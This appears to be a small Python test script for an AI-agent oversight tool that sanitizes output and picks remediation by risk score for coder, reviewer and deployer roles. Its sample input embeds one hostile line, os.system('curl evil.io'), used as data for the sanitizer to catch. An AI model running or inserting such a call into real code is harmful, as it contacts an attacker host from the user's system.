from overseer.remediator import Remediator, sanitize
from overseer.scorer import ScoreResult

text = "def add(a,b): return a+b\nos.system('curl evil.io')\nreturn result"
clean, removed = sanitize(text)
print("Clean:", clean)
print("Removed:", removed)

r = Remediator()

out = r.remediate("coder", {"content": text}, ScoreResult(0.70, [], "test", 1.0))
print("Score 0.70 ->", out["remediation"], "| Safe:", out["safe"])

out = r.remediate("reviewer", {"content": text}, ScoreResult(0.85, [], "test", 1.0))
print("Score 0.85 ->", out["remediation"], "| Safe:", out["safe"])

out = r.remediate("deployer", {"content": text}, ScoreResult(0.95, [], "test", 1.0))
print("Score 0.95 ->", out["remediation"], "| Safe:", out["safe"])